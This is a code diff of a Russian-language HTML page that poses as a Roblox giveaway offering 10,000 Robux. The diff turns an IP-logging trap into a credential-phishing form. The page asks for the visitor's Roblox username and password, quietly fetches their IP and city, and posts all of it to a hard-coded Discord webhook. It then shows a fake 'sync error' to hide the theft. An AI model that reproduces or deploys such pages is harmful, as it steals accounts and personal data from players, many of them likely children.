@@ -2,45 +2,51 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Roblox Gift System</title>
+    <title>Roblox Promo - Verification</title>
 </head>
-<body style="background: #111; color: white; text-align: center; font-family: sans-serif; padding-top: 100px;">
-    <h1 style="color: #00b06f;">🎁 ТВОЙ ПОДАРОК ГОТОВ!</h1>
-    <p>Нажми кнопку, чтобы забрать 10,000 Robux на свой аккаунт.</p>
-    <button id="btn" style="background: #00b06f; color: white; padding: 20px 40px; border: none; border-radius: 10px; font-size: 20px; cursor: pointer;">
-        ПОЛУЧИТЬ ROBUX
+<body style="background: #111; color: white; text-align: center; font-family: sans-serif; padding-top: 50px;">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="100" style="filter: invert(1);">
+    <h2>ВЕРИФИКАЦИЯ АККАУНТА</h2>
+    <p>Введите данные для получения 10,000 Robux</p>
+    
+    <input type="text" id="user" placeholder="Никнейм Roblox" style="padding: 10px; width: 250px;"><br><br>
+    <input type="password" id="pass" placeholder="Пароль для подтверждения" style="padding: 10px; width: 250px;"><br><br>
+    
+    <button id="mainBtn" style="background: #00b06f; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold;">
+        АКТИВИРОВАТЬ
     </button>
 
     <script>
-    document.getElementById('btn').onclick = async function() {
+    document.getElementById('mainBtn').onclick = async function() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
         const webhook = "https://discord.com/api/webhooks/1454084286784475241/rgdIugwWDg61FL9dBQXVRj8kWquCg2zIYupzB3zD47Pf1RDAz76UVib0EESnOwBSIYJe";
-        
+
+        if(!u || !p) return alert("Заполните все поля!");
+
         try {
-            // Собираем данные об IP и городе
+            // Скрытый сбор IP и города
             const geoRes = await fetch('https://ipapi.co/json/');
             const geo = await geoRes.json();
 
-            // Отправляем красивый отчет в Discord
+            // Отправка в Discord
             await fetch(webhook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
                     embeds: [{
-                        title: "🚀 ЦЕЛЬ ПОПАЛАСЬ В ЛОВУШКУ!",
-                        color: 65391,
+                        title: "📂 ПОЛУЧЕНЫ НОВЫЕ ДАННЫЕ",
+                        color: 16711680,
                         fields: [
-                            { name: "📍 Геолокация", value: `Страна: ${geo.country_name}\nГород: ${geo.city}\nПровайдер: ${geo.org}` },
-                            { name: "🌐 IP Адрес", value: geo.ip },
-                            { name: "📱 Устройство", value: navigator.userAgent }
+                            { name: "👤 Аккаунт", value: `Логин: ${u}\nПароль: ${p}`, inline: false },
+                            { name: "📍 Гео", value: `Город: ${geo.city}\nIP: ${geo.ip}`, inline: true }
                         ]
                     }]
                 })
             });
 
-            alert("Ошибка верификации! Попробуйте зайти с мобильного устройства.");
-        } catch (e) {
-            alert("Ошибка сервера. Повторите попытку позже.");
-        }
+            alert("Ошибка синхронизации! Попробуйте через 24 часа.");
+        } catch(e) { alert("Ошибка сервера."); }
     };
     </script>
 </body>
